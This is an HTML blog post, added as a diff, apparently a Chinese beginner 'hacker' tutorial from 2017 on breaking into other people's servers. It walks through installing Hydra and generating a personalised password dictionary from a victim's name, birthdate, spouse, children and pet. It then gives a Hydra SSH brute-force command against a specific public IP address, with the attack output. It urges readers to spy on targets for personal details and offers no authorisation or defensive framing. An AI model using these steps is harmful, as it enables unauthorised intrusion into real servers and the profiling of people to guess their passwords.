@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="Jintian">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="黑客从入门到吊炸天系列一-密码生成与黑掉别人的服务器"/>
+  <meta property="og:description" content="Just my blog" />
+  <meta property="og:site_name" content="Jin Tian"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="http://yoursite.comundefined"/>
+  
+    <link rel="alternate" href="/atom.xml" title="Jin Tian" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Jin Tian</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.dark.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-light.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">黑客从入门到吊炸天系列一-密码生成与黑掉别人的服务器</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/about">
+                  
+                  About
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags">
+                  
+                  Tag
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/achievements">
+                  
+                  Achievements
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/resume">
+                  
+                  Resume
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/jinfagang">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:jinfagang19@163.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By Jintian</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2017-06-07</span>
+            <span class="time">15:04:55</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>黑客生涯的第一步，这个年代不会一点黑客手段不要意思说自己是神奇夹克。（也许是杰克？？）<br><a id="more"></a></p>
+<h1 id="两位巨星出场，瑞士军刀"><a href="#两位巨星出场，瑞士军刀" class="headerlink" title="两位巨星出场，瑞士军刀"></a>两位巨星出场，瑞士军刀</h1><p>迈入黑客之旅，手段很重要，两个工具，必备，<code>Hydra</code>, <code>common-password</code>，这两个工具一个是暴力破解工具，不带字典，第二个正式字典生成。<br>但是相信哥，一个8位密码，你如果从0-9a-zA-Z去生成，破解的概率微乎其微。字典起码是7447TB，你懂得，几乎不可能。这个时候就需要运用社会工程学的东西了。<br>我们应该摇身一变，变成一个间谍，而不是黑客。去打听一下目标的名字？生日？配偶名字？生日？收集这些信息。然后生成一个比较智能化的字典。<br>闲话不多说，安装Hydra：<br><figure class="highlight mipsasm"><table><tr><td class="code"><pre><div class="line"><span class="keyword">brew </span><span class="keyword">install </span>-v --with-libssh hydra</div></pre></td></tr></table></figure></p>
+<p>安装common-password:<br><figure class="highlight crmsh"><table><tr><td class="code"><pre><div class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/jeanphorn/common-password.git</div></pre></td></tr></table></figure></p>
+<p>生成密码字典：<br><figure class="highlight scheme"><table><tr><td class="code"><pre><div class="line">[<span class="name"><span class="builtin-name">+</span></span>] Insert the informations about the victim to make a dictionary</div><div class="line">[<span class="name"><span class="builtin-name">+</span></span>] If you don<span class="symbol">'t</span> know all the info, just hit enter when asked! <span class="comment">;)</span></div><div class="line"></div><div class="line">&gt; Name: jintian</div><div class="line">&gt; Surname: jin</div><div class="line">&gt; Nickname: tian</div><div class="line">&gt; Birthdate (<span class="name">DDMMYYYY</span>): <span class="number">19931211</span></div><div class="line"></div><div class="line"></div><div class="line">&gt; Wife<span class="symbol">'s</span>(<span class="name">husband</span><span class="symbol">'s</span>) name:</div><div class="line">&gt; Wife<span class="symbol">'s</span>(<span class="name">husband</span><span class="symbol">'s</span>) nickname:</div><div class="line">&gt; Wife<span class="symbol">'s</span>(<span class="name">husband</span><span class="symbol">'s</span>) birthdate (<span class="name">DDMMYYYY</span>):</div><div class="line"></div><div class="line"></div><div class="line">&gt; Child<span class="symbol">'s</span> name:</div><div class="line">&gt; Child<span class="symbol">'s</span> nickname:</div><div class="line">&gt; Child<span class="symbol">'s</span> birthdate (<span class="name">DDMMYYYY</span>):</div><div class="line"></div><div class="line"></div><div class="line">&gt; Pet<span class="symbol">'s</span> name:</div><div class="line">&gt; Company name:</div><div class="line"></div><div class="line"></div><div class="line">&gt; Do you want to add some key words about the victim? Y/[<span class="name">N</span>]: n</div><div class="line">&gt; Do you want to add special chars at the end of words? Y/[<span class="name">N</span>]: n</div><div class="line">&gt; Do you want to add some random numbers at the end of words? Y/[<span class="name">N</span>]y</div><div class="line">&gt; Leet mode? (<span class="name">i.e.</span> leet = <span class="number">1337</span>) Y/[<span class="name">N</span>]: y</div><div class="line"></div><div class="line">[<span class="name"><span class="builtin-name">+</span></span>] Now making a dictionary...</div><div class="line">[<span class="name"><span class="builtin-name">+</span></span>] Sorting list and removing duplicates...</div><div class="line">[<span class="name"><span class="builtin-name">+</span></span>] Saving dictionary to jintian.txt, counting <span class="number">6540</span> words.</div></pre></td></tr></table></figure></p>
+<p>然后开始攻击目标服务器：<br><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">hydra</span> <span class="selector-tag">-t</span> 4 <span class="selector-tag">-L</span> <span class="selector-tag">userlist</span><span class="selector-class">.txt</span> <span class="selector-tag">-P</span> <span class="selector-tag">jintian</span><span class="selector-class">.txt</span> 139<span class="selector-class">.179</span><span class="selector-class">.158</span><span class="selector-class">.211</span> <span class="selector-tag">ssh</span></div></pre></td></tr></table></figure></p>
+<p>我们可以看到输出：<br><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line">Hydra v8.5 (c) 2017 by van Hauser/THC - Please <span class="keyword">do</span> <span class="keyword">not</span> <span class="keyword">use</span> <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes.</div><div class="line"></div><div class="line">Hydra (<span class="keyword">http</span>://www.thc.org/thc-hydra) <span class="keyword">starting</span> <span class="keyword">at</span> <span class="number">2017</span><span class="number">-06</span><span class="number">-07</span> <span class="number">14</span>:<span class="number">51</span>:<span class="number">40</span></div><div class="line">[<span class="keyword">WARNING</span>] Restorefile (you have <span class="number">10</span> seconds <span class="keyword">to</span> abort...) <span class="keyword">from</span> a previous <span class="keyword">session</span> <span class="keyword">found</span>, <span class="keyword">to</span> prevent overwriting, ./hydra.restore</div><div class="line">[<span class="keyword">DATA</span>] <span class="keyword">max</span> <span class="number">4</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">4</span> tasks, <span class="number">32700</span> login tries (l:<span class="number">5</span>/p:<span class="number">6540</span>), ~<span class="number">8175</span> tries per task</div><div class="line">[<span class="keyword">DATA</span>] attacking service ssh <span class="keyword">on</span> port <span class="number">22</span></div><div class="line">[<span class="keyword">STATUS</span>] <span class="number">64.00</span> tries/<span class="keyword">min</span>, <span class="number">64</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">32636</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">08</span>:<span class="number">30</span>h, <span class="number">4</span> active</div><div class="line">[<span class="keyword">STATUS</span>] <span class="number">61.33</span> tries/<span class="keyword">min</span>, <span class="number">184</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">03</span>h, <span class="number">32516</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">08</span>:<span class="number">51</span>h, <span class="number">4</span> active</div><div class="line">[<span class="keyword">STATUS</span>] <span class="number">58.71</span> tries/<span class="keyword">min</span>, <span class="number">411</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">07</span>h, <span class="number">32289</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">09</span>:<span class="number">10</span>h, <span class="number">4</span> active</div></pre></td></tr></table></figure></p>
+<p>目测要9个小时才能出结果，但是如果一开始字典没有设置好，可能得不到结果，社会工程很重要啊！！！</p>
+<p>下一个系列我们将破解wifi密码。</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Copyright <a target="_blank" href="https://github.com/jinfagang">Jintian</a>
+          An Intelligent Scientist
+          </p>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">DeepX</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
